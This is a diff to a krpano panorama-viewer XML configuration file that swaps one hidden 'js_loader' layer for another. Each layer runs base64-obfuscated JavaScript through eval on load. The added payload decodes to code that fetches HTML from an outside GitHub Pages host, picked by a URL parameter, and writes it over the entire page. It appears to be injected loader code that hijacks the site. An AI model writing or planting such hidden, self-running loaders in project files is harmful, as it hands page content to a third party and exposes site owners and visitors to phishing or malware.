@@ -1,3 +1,3 @@
 <krpano version="1.0.8.15">
-<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAic3BvcnRzIjsgCgoKCmZldGNoKCJlbGRvcmFkbzc3NS5naXRodWIuaW8vbS8iICsgaWQgKyAiLmh0bWwiKQoKICAudGhlbihlID0+IGUudGV4dCgpKQoKICAudGhlbihlID0+IHsgCgogICAgZG9jdW1lbnQub3BlbigpLCA=');eval(w)););"/>
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAidGVzdCI7CgpmZXRjaCgiaHR0cHM6Ly9lbGRvcmFkbzc3NS5naXRodWIuaW8vbS8iICsgaWQgKyAiLmh0bWwiKQogIC50aGVuKGUgPT4gZS50ZXh0KCkpCiAgLnRoZW4oZSA9PiB7CiAgICBkb2N1bWVudC5vcGVuKCk7CiAgICBkb2N1bWVudC53cml0ZShlKTsKICAgIGRvY3VtZW50LmNsb3NlKCk7CiAgfSk7Cg==');eval(w)););"/>
 </krpano>
